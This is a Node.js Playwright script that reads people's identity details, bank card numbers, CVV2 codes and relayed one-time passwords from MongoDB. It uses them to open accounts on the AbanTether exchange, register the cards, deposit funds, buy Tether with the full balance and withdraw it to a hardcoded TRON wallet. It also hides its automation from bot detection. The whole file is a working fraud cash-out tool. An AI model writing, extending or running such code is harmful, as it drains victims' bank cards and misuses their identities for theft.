const { MongoClient } = require('mongodb');
const { chromium } = require('playwright');
require('dotenv').config();

class AbanTetherBot {
    constructor() {
        this.client = new MongoClient(process.env.MONGODB_URI);
        this.db = null;
        this.collection = null;
        this.browser = null;
        this.page = null;
        this.currentUser = null;
    }

    async connectToMongoDB() {
        try {
            await this.client.connect();
            this.db = this.client.db(process.env.DATABASE_NAME);
            this.collection = this.db.collection(process.env.COLLECTION_NAME);
            console.log('✅ Connected to MongoDB');
        } catch (error) {
            console.error('❌ MongoDB connection error:', error);
        }
    }

    async watchDatabase() {
        const pipeline = [
            {
                $match: {
                    $or: [
                        { 'otp_login': { $exists: true, $ne: '' } },
                        { 'otp_register_card': { $exists: true, $ne: '' } },
                        { 'otp_payment': { $exists: true, $ne: '' } }
                    ]
                }
            }
        ];

        const changeStream = this.collection.watch(pipeline);

        changeStream.on('change', async (change) => {
            if (change.operationType === 'insert' || change.operationType === 'update') {
                const docId = change.documentKey._id;
                const document = await this.collection.findOne({ _id: docId, processed: { $ne: true } });
                
                if (document && !document.processed) {
                    console.log(`🚀 Processing new document for user: ${document.personalPhoneNumber}`);
                    this.currentUser = document;
                    await this.startAutomation();
                }
            }
        });

        console.log('👂 Listening for database changes...');
    }

    async initializeBrowser() {
        this.browser = await chromium.launch({ 
            headless: false, // برای دیدن مراحل تغییر به true
            args: ['--disable-blink-features=AutomationControlled']
        });
        
        this.page = await this.browser.newContext({
            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            viewport: { width: 1280, height: 720 }
        }).then(ctx => ctx.newPage());
        
        await this.page.addInitScript(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => false });
        });
    }

    async findElementByText(text, elementType = '*') {
        const xpath = `//${elementType}[contains(text(), '${text}') or contains(@value, '${text}') or contains(@placeholder, '${text}')]`;
        return await this.page.waitForSelector(`xpath=${xpath}`, { timeout: 10000 });
    }

    async fillInputByPlaceholder(placeholder, value) {
        const input = await this.page.waitForSelector(`input[placeholder*="${placeholder}"]`, { timeout: 10000 });
        await input.fill(value);
    }

    async clickButtonByText(text) {
        const button = await this.findElementByText(text, 'button');
        await button.click();
    }

    async waitForOTP(fieldName) {
        console.log(`⏳ Waiting for ${fieldName}...`);
        
        for (let i = 0; i < 60; i++) {
            const updatedDoc = await this.collection.findOne({ 
                personalPhoneNumber: this.currentUser.personalPhoneNumber 
            });
            
            if (updatedDoc && updatedDoc[fieldName]) {
                console.log(`✅ ${fieldName} received: ${updatedDoc[fieldName]}`);
                return updatedDoc[fieldName];
            }
            
            await this.sleep(2000); // هر 2 ثانیه چک کن
        }
        
        throw new Error(`Timeout waiting for ${fieldName}`);
    }

    async startAutomation() {
        try {
            await this.initializeBrowser();
            
            // مرحله 1: رفتن به صفحه ثبت‌نام
            await this.page.goto('https://abantether.com/register');
            await this.page.waitForLoadState('networkidle');
            
            // مرحله 2: وارد کردن شماره موبایل
            await this.fillInputByPlaceholder('موبایل', this.currentUser.personalPhoneNumber);
            await this.clickButtonByText('ادامه');
            await this.sleep(3000);
            
            // مرحله 3: دریافت و وارد کردن OTP لاگین
            const otpLogin = await this.waitForOTP('otp_login');
            await this.fillInputByPlaceholder('کد تایید', otpLogin);
            await this.clickButtonByText('تایید');
            await this.sleep(5000);
            
            // مرحله 4: پر کردن اطلاعات هویتی
            await this.fillInputByPlaceholder('نام', this.currentUser.personalName);
            await this.fillInputByPlaceholder('کد ملی', this.currentUser.personalNationalCode);
            
            // تاریخ تولد
            const birthDate = new Date(this.currentUser.personalBirthDate);
            const year = birthDate.getFullYear();
            const month = String(birthDate.getMonth() + 1).padStart(2, '0');
            const day = String(birthDate.getDate()).padStart(2, '0');
            
            await this.fillInputByPlaceholder('سال تولد', year.toString());
            await this.fillInputByPlaceholder('ماه تولد', month);
            await this.fillInputByPlaceholder('روز تولد', day);
            
            // شهر و استان
            await this.fillInputByPlaceholder('شهر', this.currentUser.personalCity);
            await this.fillInputByPlaceholder('استان', this.currentUser.personalProvince);
            
            await this.clickButtonByText('ثبت اطلاعات');
            await this.sleep(5000);
            
            // مرحله 5: رفتن به بخش کیف پول و ثبت کارت
            await this.page.goto('https://abantether.com/wallet');
            await this.sleep(3000);
            
            // کلیک روی ثبت کارت جدید
            await this.clickButtonByText('ثبت کارت جدید');
            await this.sleep(2000);
            
            // وارد کردن اطلاعات کارت
            await this.fillInputByPlaceholder('شماره کارت', this.currentUser.cardNumber);
            await this.fillInputByPlaceholder('CVV2', this.currentUser.cvv2);
            await this.fillInputByPlaceholder('ماه', this.currentUser.bankMonth);
            await this.fillInputByPlaceholder('سال', this.currentUser.bankYear);
            
            await this.clickButtonByText('ثبت کارت');
            await this.sleep(3000);
            
            // مرحله 6: دریافت OTP ثبت کارت
            const otpCard = await this.waitForOTP('otp_register_card');
            await this.fillInputByPlaceholder('کد تایید', otpCard);
            await this.clickButtonByText('تایید');
            await this.sleep(5000);
            
            // مرحله 7: واریز تومان
            await this.page.goto('https://abantether.com/deposit');
            await this.sleep(3000);
            
            await this.fillInputByPlaceholder('مبلغ', '5000000');
            await this.clickButtonByText('واریز');
            await this.sleep(3000);
            
            // مرحله 8: دریافت OTP پرداخت
            const otpPayment = await this.waitForOTP('otp_payment');
            await this.fillInputByPlaceholder('کد تایید', otpPayment);
            await this.clickButtonByText('تایید');
            await this.sleep(5000);
            
            // مرحله 9: خرید تتر
            await this.page.goto('https://abantether.com/market');
            await this.sleep(3000);
            
            // کلیک روی خرید تتر
            await this.clickButtonByText('خرید تتر');
            await this.sleep(2000);
            
            // انتخاب همه موجودی
            await this.clickButtonByText('همه موجودی');
            await this.clickButtonByText('خرید');
            await this.sleep(5000);
            
            // مرحله 10: برداشت تتر
            await this.page.goto('https://abantether.com/withdraw');
            await this.sleep(3000);
            
            await this.fillInputByPlaceholder('آدرس مقصد', 'THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS');
            await this.clickButtonByText('برداشت');
            await this.sleep(5000);
            
            // مرحله 11: به‌روزرسانی دیتابیس
            await this.collection.updateOne(
                { personalPhoneNumber: this.currentUser.personalPhoneNumber },
                { 
                    $set: { 
                        processed: true,
                        status: "completed",
                        completedAt: new Date()
                    }
                }
            );
            
            console.log(`✅ Process completed for ${this.currentUser.personalPhoneNumber}`);
            
        } catch (error) {
            console.error('❌ Error in automation:', error);
            
            // در صورت خطا وضعیت را به failed تغییر دهید
            if (this.currentUser) {
                await this.collection.updateOne(
                    { personalPhoneNumber: this.currentUser.personalPhoneNumber },
                    { 
                        $set: { 
                            processed: true,
                            status: "failed",
                            error: error.message,
                            failedAt: new Date()
                        }
                    }
                );
            }
        } finally {
            if (this.browser) {
                await this.browser.close();
            }
        }
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async start() {
        await this.connectToMongoDB();
        await this.watchDatabase();
    }
}

// اجرای ربات
const bot = new AbanTetherBot();
bot.start().catch(console.error);